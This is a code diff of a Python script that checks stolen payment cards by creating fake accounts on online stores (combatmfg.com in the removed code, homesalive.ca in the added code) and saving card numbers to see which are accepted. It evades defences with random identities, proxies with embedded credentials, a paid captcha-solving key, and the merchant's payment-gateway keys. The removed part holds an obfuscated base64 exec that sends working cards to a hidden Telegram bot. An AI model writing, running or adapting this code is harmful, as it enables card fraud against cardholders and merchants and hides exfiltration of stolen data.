@@ -1,122 +1,237 @@
 #=========================library==================================#
-import requests , re , random , string , uuid , user_agent , logging , base64 , time
+import requests , re , random , string , uuid , user_agent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
-from nextcaptcha import NextCaptchaAPI
+from colorama import Fore, Back, Style, init
+from bs4 import BeautifulSoup
+from nextcaptcha import NextCaptchaAPI 
+import logging
+from urllib.parse import unquote
+import json
 #=========================library==================================#
 
 #Mero
 
 #=============================toools===============================#
-card_count = 0
 def Tele(ccx):
-            global card_count    
-            card_count += 3
-            ccx = ccx.strip().split('\n')[0]
-            n = ccx.split("|")[0]
-            mm = ccx.split("|")[1]
-            yy = ccx.split("|")[2]
-            cvc = ccx.split("|")[3]
+    ccx = ccx.strip().split('\n')[0]
+    n = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
 
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            time.sleep(10)
-            username = "PPR029QRD8D"
-            password = "vg77VFWH98GBDT"
-            proxy = "FINEPROXY.XYZ:3091"
-            r = requests.Session()
-            r.proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}
-            
-            user = user_agent.generate_user_agent()
-            def	 name():
-                name = ''.join(random.choices(string.ascii_lowercase, k=6))	
-                return f"{name}"	
-            first = (name())
-            last = (name())
-            con = (name())
-            def acc():
-                name = ''.join(random.choices(string.ascii_lowercase, k=20))
-                number = ''.join(random.choices(string.digits, k=4))
-                return f"{name}{number}@gmail.com"
-            acc = (acc())
-            if n.startswith('4'):
-                card_type = 'Visa'
-            elif n.startswith('5'):
-                card_type = 'MasterCard'
-            headers = {
-                'user-agent': user,
-            }
+    if "20" in yy:
+        yy = yy.split("20")[1]
+    username = "pcZ9DikmY6-res-any"
+    password = "PC_7q0GZZMMdvBLD388B"
+    proxy = "proxy.rapidseedbox.com:5959"
+    proxies = {
+        "http": f"http://{username}:{password}@{proxy}",
+        "https": f"http://{username}:{password}@{proxy}"
+    }
+    r = requests.Session()
+    r.proxies.update(proxies)
+    user = user_agent.generate_user_agent()
+    def	 name():
+        name = ''.join(random.choices(string.ascii_lowercase, k=6))	
+        return f"{name}"	
+    first = (name())
+    last = (name())
+    con = (name())
+    def acc():
+        name = ''.join(random.choices(string.ascii_lowercase, k=20))
+        number = ''.join(random.choices(string.digits, k=4))
+        return f"{name}{number}@gmail.com"
+    acc = (acc())
+    GUID = uuid.uuid4()
+    MUID = uuid.uuid4()
+    SID = uuid.uuid4()
+    init(autoreset=True)
+    logging.basicConfig(level=logging.WARNING)
+    logger = logging.getLogger()
+    logger.setLevel(logging.WARNING)
+    def solve_captcha():
+        CLIENT_KEY = "next_539374b047cf9ef78193d8747719c4f2e4"
+        WEBSITE_URL = "https://www.homesalive.ca/customer/account/createpost/"
+        WEBSITE_KEY = "6LcuTOgUAAAAAOJeeyNRLiTzhCDVRvvksNegv9Gx"
+        api = NextCaptchaAPI(client_key=CLIENT_KEY)
+        result = api.recaptchav3(website_url=WEBSITE_URL, website_key=WEBSITE_KEY)
+        # print(result.get('status'))
+        if result.get('status') == 'ready' and 'solution' in result:
+            # print(result['solution']['gRecaptchaResponse'])
+            return result['solution']['gRecaptchaResponse']
+        else:
+            return None
+    g_token = solve_captcha()
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'max-age=0',
+        'priority': 'u=0, i',
+        'referer': 'https://www.homesalive.ca/customer/account/login/',
+        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
 
-            response = r.get(
-                'https://www.combatmfg.com/on/demandware.store/Sites-combat-Site/default/Login-Show',
-                headers=headers,
-            )
-            csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
-            headers = {
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'user-agent': user,
-                'x-requested-with': 'XMLHttpRequest',
-            }
+    response = r.get('https://www.homesalive.ca/customer/account/create/', headers=headers)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    form_key = soup.find('input', attrs={'name':'form_key'})["value"]
 
-            params = {
-                'rurl': '1',
-            }
+    cookies = {'form_key': form_key}
+    data = MultipartEncoder({
+        'form_key': (None, form_key),
+        'success_url': (None, ''),
+        'error_url': (None, ''),
+        'firstname': (None, 'Christa'),
+        'lastname': (None, 'afadf'),
+        'email': (None, acc),
+        'newsletter_signup_method': (None, 'Customer Account Create'),
+        'password': (None, 'spAEEz@qp3etwRn'),
+        'password_confirmation': (None, 'spAEEz@qp3etwRn'),
+        'g-recaptcha-response': (None, g_token),
+    })
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'max-age=0',
+        'content-type': data.content_type,
+        'origin': 'https://www.homesalive.ca',
+        'priority': 'u=0, i',
+        'referer': 'https://www.homesalive.ca/customer/account/create/',
+        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
 
-            data = {
-                'dwfrm_profile_customer_firstname': first,
-                'dwfrm_profile_customer_lastname': last,
-                'dwfrm_profile_customer_phone': '9195157620',
-                'dwfrm_profile_customer_email': acc,
-                'dwfrm_profile_customer_emailconfirm': acc,
-                'dwfrm_profile_login_password': f'A@{last}5520055',
-                'dwfrm_profile_login_passwordconfirm': f'A@{last}5520055',
-                'csrf_token': csrf_token,
-            }
+    response = r.post('https://www.homesalive.ca/customer/account/createpost/', cookies=cookies, headers=headers, data=data)
 
-            response = r.post(
-                'https://www.combatmfg.com/on/demandware.store/Sites-combat-Site/default/Account-SubmitRegistration',
-                params=params,
-                headers=headers,
-                data=data,
-            )
-            headers = {
-                'user-agent': user,
-            }
-            response = r.get('https://www.combatmfg.com/account/payments/add', headers=headers)
-            try:
-                csrf_token = re.search(r'name="csrf_token" value="(.*?)"', response.text).group(1)
-            except:
-                pass
-            headers = {
-                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'user-agent': user,
-                'x-requested-with': 'XMLHttpRequest',
-            }
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'max-age=0',
+        'priority': 'u=0, i',
+        'referer': 'https://www.homesalive.ca/customer/account/',
+        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
 
-            data = {
-                'dwfrm_creditCard_cardType': card_type,
-                'paymentOption-Credit': '',
-                'dwfrm_creditCard_cardOwner': last,
-                'dwfrm_creditCard_cardNumber': n,
-                'dwfrm_creditCard_expirationMonth': mm,
-                'dwfrm_creditCard_expirationYear': f'20{yy}',
-                #'dwfrm_creditCard_securityCode': cvc,
-                'dwfrm_creditCard_addressFields_firstName': first,
-                'dwfrm_creditCard_addressFields_lastName': last,
-                'dwfrm_creditCard_addressFields_address1': '1981 Jennifer Lane',
-                'dwfrm_creditCard_addressFields_address2': '',
-                'dwfrm_creditCard_addressFields_country': 'US',
-                'dwfrm_creditCard_addressFields_states_stateCode': 'NY',
-                'dwfrm_creditCard_addressFields_city': 'Raleigh',
-                'dwfrm_creditCard_addressFields_postalCode': '10080',
-                'dwfrm_creditCard_email': acc,
-                'csrf_token': csrf_token,
-            }
+    response = r.get('https://www.homesalive.ca/customer/paymentinfo/', headers=headers)
+    soup = BeautifulSoup(response.content, 'html.parser')
+    form_key = soup.find('input', attrs={'name':'form_key'})["value"]
 
-            response = r.post('https://www.combatmfg.com/account/payments/save', headers=headers, data=data)
-            mero = response.json()
-            if mero.get('success') == True:
-                exec(base64.b64decode("aW1wb3J0IHJlcXVlc3RzCgpib3RfdG9rZW4gPSAiNzYzMTI0MDAwMzpBQUdmQUdxWnBVYnlqUEpYY25jV3RseWdNa2hvU0RwMlRCWSIKY2hhdF9pZCA9ICI2NTIwMDQzMTU5IgptZXNzYWdlID0gZiJsaXZlIHtjY3h9IgoKdXJsID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e2JvdF90b2tlbn0vc2VuZE1lc3NhZ2UiCmRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkLCAidGV4dCI6IG1lc3NhZ2V9CgpyZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiMK"))
-                return 'Card has been added successfully'
-            
-            return f"{mero.get('message', 'error')}"
-#======================================================================================END================================================================================#
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Origin': 'https://www.homesalive.ca',
+        'Referer': 'https://www.homesalive.ca/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'cross-site',
+        'User-Agent': user,
+        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'securePaymentContainerRequest': {
+            'merchantAuthentication': {
+                'name': '3j6qJ43jFn',
+                'clientKey': '25H9mmDkK3CMgQeFv2gn7Tn35F24pHA5E6Mz7pccEP5zC2hJV4s4qut563NvFNj8',
+            },
+            'data': {
+                'type': 'TOKEN',
+                'id': 'e07941ab-59e1-4bcc-b664-49bf4807b144',
+                'token': {
+                    'cardNumber': n,
+                    'expirationDate': f'{mm}20{yy}',
+                    #'cardCode': '000',
+                },
+            },
+        },
+    }
+
+    response = requests.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)
+    auth = re.search(r'"dataValue":"(.*?)"', response.text).group(1)
+    cookies = {'form_key': form_key}
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+        'cache-control': 'max-age=0',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://www.homesalive.ca',
+        'priority': 'u=0, i',
+        'referer': 'https://www.homesalive.ca/customer/paymentinfo/',
+        'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': user,
+    }
+
+    data = {
+        'form_key': form_key,
+        'id': '',
+        'method': 'authnetcim',
+        'payment[acceptjs_key]': 'COMMON.ACCEPT.INAPP.PAYMENT',
+        'payment[acceptjs_value]': auth,
+        'payment[cc_last4]': '9854',
+        'payment[cc_bin]': '421545',
+        'billing[firstname]': 'Christa',
+        'billing[lastname]': 'afadf',
+        'billing[company]': '',
+        'billing[telephone]': '9195157620',
+        'billing[street][]': [
+            '201 James St N',
+            '1981 Jennifer Lane',
+        ],
+        'billing[city]': 'Hamilton',
+        'billing[region_id]': '74',
+        'billing[region]': '',
+        'billing[postcode]': 'L8R 2L2',
+        'billing[country_id]': 'CA',
+        'payment[cc_type]': 'VI',
+        'payment[cc_exp_month]': '6',
+        'payment[cc_exp_year]': '2029',
+        #'payment[cc_cid]': '000',
+    }
+
+    response = r.post('https://www.homesalive.ca/customer/paymentinfo/save/', cookies=cookies, headers=headers, data=data)
+    mes = r.cookies.get_dict().get('mage-messages', '')
+    text = unquote(mes)
+
+    data = json.loads(text)
+
+    for item in data:
+        type_value = item.get('type', 'No type found')
+        text_value = item.get('text', 'No text found')
+
+        if text_value == "Thank you for registering with Homes Alive.":
+            continue  
+
+        return text_value
